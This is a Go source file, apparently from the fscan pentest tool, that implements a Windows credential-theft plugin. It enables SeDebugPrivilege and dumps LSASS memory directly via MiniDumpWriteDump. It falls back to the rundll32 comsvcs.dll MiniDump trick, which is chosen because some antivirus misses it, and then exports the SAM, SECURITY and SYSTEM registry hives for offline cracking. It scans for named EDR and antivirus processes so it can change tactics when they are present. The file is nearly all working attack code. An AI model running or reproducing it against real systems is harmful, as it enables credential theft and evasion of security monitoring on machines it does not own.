//go:build (plugin_minidump || !plugin_selective) && windows && !no_local

package local

import (
	"context"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/shadow1ng/fscan/common"
	"github.com/shadow1ng/fscan/common/i18n"
	"github.com/shadow1ng/fscan/plugins"
	"golang.org/x/sys/windows"
)

const (
	TH32CS_SNAPPROCESS   = 0x00000002
	INVALID_HANDLE_VALUE = ^uintptr(0)
	MAX_PATH             = 260
	PROCESS_ALL_ACCESS   = 0x1F0FFF
	SE_PRIVILEGE_ENABLED = 0x00000002
)

type PROCESSENTRY32 struct {
	dwSize              uint32
	cntUsage            uint32
	th32ProcessID       uint32
	th32DefaultHeapID   uintptr
	th32ModuleID        uint32
	cntThreads          uint32
	th32ParentProcessID uint32
	pcPriClassBase      int32
	dwFlags             uint32
	szExeFile           [MAX_PATH]uint16
}

type LUID struct {
	LowPart  uint32
	HighPart int32
}

type LUID_AND_ATTRIBUTES struct {
	Luid       LUID
	Attributes uint32
}

type TOKEN_PRIVILEGES struct {
	PrivilegeCount uint32
	Privileges     [1]LUID_AND_ATTRIBUTES
}

// MiniDumpPlugin 内存转储插件
// 设计哲学：直接实现，删除过度设计
// - 删除复杂的继承体系
// - 直接实现内存转储功能
// - 保持原有功能逻辑
type MiniDumpPlugin struct {
	plugins.BasePlugin
	kernel32 *syscall.DLL
	dbghelp  *syscall.DLL
	advapi32 *syscall.DLL
}

// ProcessManager Windows进程管理器
type ProcessManager struct {
	kernel32 *syscall.DLL
	dbghelp  *syscall.DLL
	advapi32 *syscall.DLL
}

// NewMiniDumpPlugin 创建内存转储插件
func NewMiniDumpPlugin() *MiniDumpPlugin {
	return &MiniDumpPlugin{
		BasePlugin: plugins.NewBasePlugin("minidump"),
	}
}

// Scan 执行凭据提取——降级链：直接dump → comsvcs.dll → reg save
func (p *MiniDumpPlugin) Scan(ctx context.Context, info *common.HostInfo, session *common.ScanSession) *plugins.Result {
	_ = session.Config
	_ = session.State
	defer func() {
		if r := recover(); r != nil {
			common.LogError(i18n.Tr("minidump_panic", r))
		}
	}()

	var output strings.Builder

	// 检查管理员权限
	if !p.isAdmin() {
		return &plugins.Result{Success: false, Output: "需要管理员权限\n", Error: errors.New("需要管理员权限")}
	}

	if err := p.loadSystemDLLs(); err != nil {
		return &plugins.Result{Success: false, Output: fmt.Sprintf("加载系统DLL失败: %v\n", err), Error: err}
	}
	defer p.releaseSystemDLLs()

	pm := &ProcessManager{kernel32: p.kernel32, dbghelp: p.dbghelp, advapi32: p.advapi32}
	avActive := p.isAVBlocking()

	// 方式1：直接 MiniDumpWriteDump（无杀软时尝试）
	if !avActive {
		output.WriteString("[*] 尝试直接内存转储...\n")
		if ok := p.tryDirectDump(ctx, pm, &output); ok {
			return &plugins.Result{Success: true, Type: plugins.ResultTypeService, Output: output.String()}
		}
	} else {
		output.WriteString("[*] 检测到杀软防护，跳过直接dump\n")
	}

	// 方式2：comsvcs.dll（系统签名DLL，部分杀软不拦截）
	output.WriteString("[*] 尝试 comsvcs.dll 方式...\n")
	if ok := p.tryComsvcsDump(pm, &output); ok {
		return &plugins.Result{Success: true, Type: plugins.ResultTypeService, Output: output.String()}
	}

	// 方式3：reg save 导出注册表 hive（离线破解，不碰 LSASS）
	output.WriteString("[*] 尝试 reg save 导出注册表...\n")
	if ok := p.tryRegSave(&output); ok {
		return &plugins.Result{Success: true, Type: plugins.ResultTypeService, Output: output.String()}
	}

	output.WriteString("[!] 所有方式均失败\n")
	return &plugins.Result{Success: false, Output: output.String(), Error: errors.New("所有凭据提取方式均失败")}
}

func (p *MiniDumpPlugin) tryDirectDump(ctx context.Context, pm *ProcessManager, output *strings.Builder) bool {
	pid, err := pm.findProcess("lsass.exe")
	if err != nil {
		output.WriteString(fmt.Sprintf("  查找lsass.exe失败: %v\n", err))
		return false
	}

	if privErr := pm.elevatePrivileges(); privErr != nil {
		output.WriteString(fmt.Sprintf("  权限提升失败: %v\n", privErr))
		return false
	}

	outputPath := filepath.Join(".", fmt.Sprintf("lsass-%d.dmp", pid))
	dumpCtx, cancel := context.WithTimeout(ctx, 15*time.Second)
	defer cancel()

	if err := pm.dumpProcessWithTimeout(dumpCtx, pid, outputPath); err != nil {
		output.WriteString(fmt.Sprintf("  直接dump失败: %v\n", err))
		os.Remove(outputPath)
		return false
	}

	return p.reportSuccess(output, outputPath, "直接内存转储")
}

func (p *MiniDumpPlugin) tryComsvcsDump(pm *ProcessManager, output *strings.Builder) bool {
	pid, err := pm.findProcess("lsass.exe")
	if err != nil {
		output.WriteString(fmt.Sprintf("  查找lsass.exe失败: %v\n", err))
		return false
	}

	_ = pm.elevatePrivileges()

	outputPath := filepath.Join(".", fmt.Sprintf("lsass-%d.dmp", pid))
	cmd := exec.Command("rundll32.exe", "C:\\Windows\\System32\\comsvcs.dll,", "MiniDump",
		fmt.Sprintf("%d", pid), outputPath, "full")
	if err := cmd.Run(); err != nil {
		output.WriteString(fmt.Sprintf("  comsvcs.dll失败: %v\n", err))
		return false
	}

	return p.reportSuccess(output, outputPath, "comsvcs.dll")
}

func (p *MiniDumpPlugin) tryRegSave(output *strings.Builder) bool {
	files := map[string]string{
		"SAM":      filepath.Join(".", "sam.hiv"),
		"SECURITY": filepath.Join(".", "security.hiv"),
		"SYSTEM":   filepath.Join(".", "system.hiv"),
	}

	saved := 0
	for hive, path := range files {
		if err := exec.Command("reg", "save", fmt.Sprintf("HKLM\\%s", hive), path, "/y").Run(); err == nil {
			if fi, err := os.Stat(path); err == nil {
				output.WriteString(fmt.Sprintf("  ✓ %s → %s (%d bytes)\n", hive, path, fi.Size()))
				saved++
			}
		} else {
			output.WriteString(fmt.Sprintf("  ✗ %s 导出失败\n", hive))
		}
	}

	if saved == 3 {
		output.WriteString("[+] 注册表 hive 导出完成，可用 secretsdump 离线解析\n")
		common.LogSuccess(i18n.Tr("minidump_regsave_success"))
		return true
	}
	return false
}

func (p *MiniDumpPlugin) reportSuccess(output *strings.Builder, path, method string) bool {
	fi, err := os.Stat(path)
	if err != nil || fi.Size() == 0 {
		return false
	}
	output.WriteString(fmt.Sprintf("[+] %s成功: %s (%d bytes)\n", method, path, fi.Size()))
	common.LogSuccess(i18n.Tr("minidump_success", path, fi.Size()))
	return true
}

// loadSystemDLLs 加载系统DLL
func (p *MiniDumpPlugin) loadSystemDLLs() error {
	kernel32, err := syscall.LoadDLL("kernel32.dll")
	if err != nil {
		return fmt.Errorf("加载 kernel32.dll 失败: %w", err)
	}

	dbghelp, err := syscall.LoadDLL("Dbghelp.dll")
	if err != nil {
		return fmt.Errorf("加载 Dbghelp.dll 失败: %w", err)
	}

	advapi32, err := syscall.LoadDLL("advapi32.dll")
	if err != nil {
		return fmt.Errorf("加载 advapi32.dll 失败: %w", err)
	}

	p.kernel32 = kernel32
	p.dbghelp = dbghelp
	p.advapi32 = advapi32

	return nil
}

// releaseSystemDLLs 释放已加载的系统DLL
func (p *MiniDumpPlugin) releaseSystemDLLs() {
	for _, dll := range []*syscall.DLL{p.kernel32, p.dbghelp, p.advapi32} {
		if dll != nil {
			_ = dll.Release()
		}
	}
}

// isAdmin 检查是否具有管理员权限
func (p *MiniDumpPlugin) isAdmin() bool {
	var sid *windows.SID
	err := windows.AllocateAndInitializeSid(
		&windows.SECURITY_NT_AUTHORITY,
		2,
		windows.SECURITY_BUILTIN_DOMAIN_RID,
		windows.DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0,
		&sid)
	if err != nil {
		return false
	}
	defer func() { _ = windows.FreeSid(sid) }()

	token := windows.Token(0)
	member, err := token.IsMember(sid)
	return err == nil && member
}

// ProcessManager 方法实现

// findProcess 查找进程
func (pm *ProcessManager) findProcess(name string) (uint32, error) {
	snapshot, err := pm.createProcessSnapshot()
	if err != nil {
		return 0, err
	}
	defer pm.closeHandle(snapshot)

	return pm.findProcessInSnapshot(snapshot, name)
}

// createProcessSnapshot 创建进程快照
func (pm *ProcessManager) createProcessSnapshot() (uintptr, error) {
	proc, err := pm.kernel32.FindProc("CreateToolhelp32Snapshot")
	if err != nil {
		return 0, fmt.Errorf("查找CreateToolhelp32Snapshot函数失败: %w", err)
	}

	handle, _, err := proc.Call(uintptr(TH32CS_SNAPPROCESS), 0)
	if handle == uintptr(INVALID_HANDLE_VALUE) {
		lastError := windows.GetLastError()
		//nolint:errorlint // Windows LastError不应该wrapped
		return 0, fmt.Errorf("创建进程快照失败: %v (LastError: %d)", err, lastError)
	}
	return handle, nil
}

// findProcessInSnapshot 在快照中查找进程
func (pm *ProcessManager) findProcessInSnapshot(snapshot uintptr, name string) (uint32, error) {
	var pe32 PROCESSENTRY32
	pe32.dwSize = uint32(unsafe.Sizeof(pe32))

	proc32First, err := pm.kernel32.FindProc("Process32FirstW")
	if err != nil {
		return 0, fmt.Errorf("查找Process32FirstW函数失败: %w", err)
	}

	proc32Next, err := pm.kernel32.FindProc("Process32NextW")
	if err != nil {
		return 0, fmt.Errorf("查找Process32NextW函数失败: %w", err)
	}

	lstrcmpi, err := pm.kernel32.FindProc("lstrcmpiW")
	if err != nil {
		return 0, fmt.Errorf("查找lstrcmpiW函数失败: %w", err)
	}

	ret, _, _ := proc32First.Call(snapshot, uintptr(unsafe.Pointer(&pe32)))
	if ret == 0 {
		//nolint:errorlint // Windows LastError不应该wrapped
		return 0, fmt.Errorf("获取第一个进程失败 (LastError: %d)", windows.GetLastError())
	}

	for {
		namePtr, err := syscall.UTF16PtrFromString(name)
		if err != nil {
			return 0, fmt.Errorf("转换进程名失败: %w", err)
		}

		ret, _, _ = lstrcmpi.Call(
			uintptr(unsafe.Pointer(namePtr)),
			uintptr(unsafe.Pointer(&pe32.szExeFile[0])),
		)

		if ret == 0 {
			return pe32.th32ProcessID, nil
		}

		ret, _, _ = proc32Next.Call(snapshot, uintptr(unsafe.Pointer(&pe32)))
		if ret == 0 {
			break
		}
	}

	return 0, fmt.Errorf("未找到进程: %s", name)
}

// elevatePrivileges 提升权限
func (pm *ProcessManager) elevatePrivileges() error {
	handle, err := pm.getCurrentProcess()
	if err != nil {
		return err
	}

	var token syscall.Token
	err = syscall.OpenProcessToken(handle, syscall.TOKEN_ADJUST_PRIVILEGES|syscall.TOKEN_QUERY, &token)
	if err != nil {
		return fmt.Errorf("打开进程令牌失败: %w", err)
	}
	defer func() { _ = token.Close() }()

	var tokenPrivileges TOKEN_PRIVILEGES

	privilegeName, err := syscall.UTF16PtrFromString("SeDebugPrivilege")
	if err != nil {
		return fmt.Errorf("转换权限名称失败: %w", err)
	}

	lookupPrivilegeValue := pm.advapi32.MustFindProc("LookupPrivilegeValueW")
	ret, _, err := lookupPrivilegeValue.Call(
		0,
		uintptr(unsafe.Pointer(privilegeName)),
		uintptr(unsafe.Pointer(&tokenPrivileges.Privileges[0].Luid)),
	)
	if ret == 0 {
		return fmt.Errorf("查找特权值失败: %w", err)
	}

	tokenPrivileges.PrivilegeCount = 1
	tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED

	adjustTokenPrivileges := pm.advapi32.MustFindProc("AdjustTokenPrivileges")
	ret, _, err = adjustTokenPrivileges.Call(
		uintptr(token),
		0,
		uintptr(unsafe.Pointer(&tokenPrivileges)),
		0, 0, 0,
	)
	if ret == 0 {
		return fmt.Errorf("调整令牌特权失败: %w", err)
	}

	return nil
}

// getCurrentProcess 获取当前进程句柄
func (pm *ProcessManager) getCurrentProcess() (syscall.Handle, error) {
	proc := pm.kernel32.MustFindProc("GetCurrentProcess")
	handle, _, _ := proc.Call()
	if handle == 0 {
		return 0, fmt.Errorf("获取当前进程句柄失败")
	}
	return syscall.Handle(handle), nil
}

// dumpProcessWithTimeout 带超时的转储进程内存
func (pm *ProcessManager) dumpProcessWithTimeout(ctx context.Context, pid uint32, outputPath string) error {
	resultChan := make(chan error, 1)

	go func() {
		resultChan <- pm.dumpProcess(pid, outputPath)
	}()

	select {
	case err := <-resultChan:
		return err
	case <-ctx.Done():
		return fmt.Errorf("内存转储超时 (120秒)")
	}
}

// dumpProcess 转储进程内存
func (pm *ProcessManager) dumpProcess(pid uint32, outputPath string) error {
	processHandle, err := pm.openProcess(pid)
	if err != nil {
		return err
	}
	defer pm.closeHandle(processHandle)

	fileHandle, err := pm.createDumpFile(outputPath)
	if err != nil {
		return err
	}
	defer pm.closeHandle(fileHandle)

	miniDumpWriteDump, err := pm.dbghelp.FindProc("MiniDumpWriteDump")
	if err != nil {
		return fmt.Errorf("查找MiniDumpWriteDump函数失败: %w", err)
	}

	// 转储类型标志
	const MiniDumpWithDataSegs = 0x00000001
	const MiniDumpWithFullMemory = 0x00000002
	const MiniDumpWithHandleData = 0x00000004
	const MiniDumpWithUnloadedModules = 0x00000020
	const MiniDumpWithIndirectlyReferencedMemory = 0x00000040
	const MiniDumpWithProcessThreadData = 0x00000100
	const MiniDumpWithPrivateReadWriteMemory = 0x00000200
	const MiniDumpWithFullMemoryInfo = 0x00000800
	const MiniDumpWithThreadInfo = 0x00001000
	const MiniDumpWithCodeSegs = 0x00002000

	// 组合转储类型标志
	dumpType := MiniDumpWithDataSegs | MiniDumpWithFullMemory | MiniDumpWithHandleData |
		MiniDumpWithUnloadedModules | MiniDumpWithIndirectlyReferencedMemory |
		MiniDumpWithProcessThreadData | MiniDumpWithPrivateReadWriteMemory |
		MiniDumpWithFullMemoryInfo | MiniDumpWithThreadInfo | MiniDumpWithCodeSegs

	ret, _, _ := miniDumpWriteDump.Call(
		processHandle,
		uintptr(pid),
		fileHandle,
		uintptr(dumpType),
		0, 0, 0,
	)

	if ret == 0 {
		// 尝试使用较小的转储类型作为后备
		fallbackDumpType := MiniDumpWithDataSegs | MiniDumpWithPrivateReadWriteMemory | MiniDumpWithHandleData

		ret, _, _ = miniDumpWriteDump.Call(
			processHandle,
			uintptr(pid),
			fileHandle,
			uintptr(fallbackDumpType),
			0, 0, 0,
		)

		if ret == 0 {
			//nolint:errorlint // Windows LastError不应该wrapped
			return fmt.Errorf("写入转储文件失败 (LastError: %d)", windows.GetLastError())
		}
	}

	return nil
}

// openProcess 打开进程
func (pm *ProcessManager) openProcess(pid uint32) (uintptr, error) {
	proc, err := pm.kernel32.FindProc("OpenProcess")
	if err != nil {
		return 0, fmt.Errorf("查找OpenProcess函数失败: %w", err)
	}

	handle, _, callErr := proc.Call(uintptr(PROCESS_ALL_ACCESS), 0, uintptr(pid))
	if handle == 0 {
		lastError := windows.GetLastError()
		//nolint:errorlint // Windows LastError不应该wrapped
		return 0, fmt.Errorf("打开进程失败: %v (LastError: %d)", callErr, lastError)
	}
	return handle, nil
}

// createDumpFile 创建转储文件
func (pm *ProcessManager) createDumpFile(path string) (uintptr, error) {
	pathPtr, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return 0, err
	}

	createFile, err := pm.kernel32.FindProc("CreateFileW")
	if err != nil {
		return 0, fmt.Errorf("查找CreateFileW函数失败: %w", err)
	}

	handle, _, callErr := createFile.Call(
		uintptr(unsafe.Pointer(pathPtr)),
		syscall.GENERIC_WRITE,
		0, 0,
		syscall.CREATE_ALWAYS,
		syscall.FILE_ATTRIBUTE_NORMAL,
		0,
	)

	if handle == INVALID_HANDLE_VALUE {
		lastError := windows.GetLastError()
		//nolint:errorlint // Windows LastError不应该wrapped
		return 0, fmt.Errorf("创建文件失败: %v (LastError: %d)", callErr, lastError)
	}

	return handle, nil
}

// closeHandle 关闭句柄
func (pm *ProcessManager) closeHandle(handle uintptr) {
	if proc, err := pm.kernel32.FindProc("CloseHandle"); err == nil {
		_, _, _ = proc.Call(handle)
	}
}

// isAVBlocking 检测是否有杀软会拦截 LSASS dump
func (p *MiniDumpPlugin) isAVBlocking() bool {
	avProcesses := []string{
		"MsMpEng.exe", "MsSense.exe",
		"CylanceSvc.exe",
		"csfalconservice.exe",
		"SentinelServiceHost.exe", "SentinelAgent.exe",
		"xagt.exe",
		"elastic-endpoint.exe",
		"cb.exe", "CbDefense.exe",
	}

	snapshot, err := p.kernel32.FindProc("CreateToolhelp32Snapshot")
	if err != nil {
		return false
	}
	handle, _, _ := snapshot.Call(TH32CS_SNAPPROCESS, 0)
	if handle == INVALID_HANDLE_VALUE {
		return false
	}
	defer p.kernel32.MustFindProc("CloseHandle").Call(handle)

	first, _ := p.kernel32.FindProc("Process32FirstW")
	next, _ := p.kernel32.FindProc("Process32NextW")

	var entry PROCESSENTRY32
	entry.dwSize = uint32(unsafe.Sizeof(entry))

	ret, _, _ := first.Call(handle, uintptr(unsafe.Pointer(&entry)))
	for ret != 0 {
		name := syscall.UTF16ToString(entry.szExeFile[:])
		for _, av := range avProcesses {
			if strings.EqualFold(name, av) {
				return true
			}
		}
		ret, _, _ = next.Call(handle, uintptr(unsafe.Pointer(&entry)))
	}
	return false
}

// 注册插件
func init() {
	RegisterLocalPlugin("minidump", func() Plugin {
		return NewMiniDumpPlugin()
	})
}
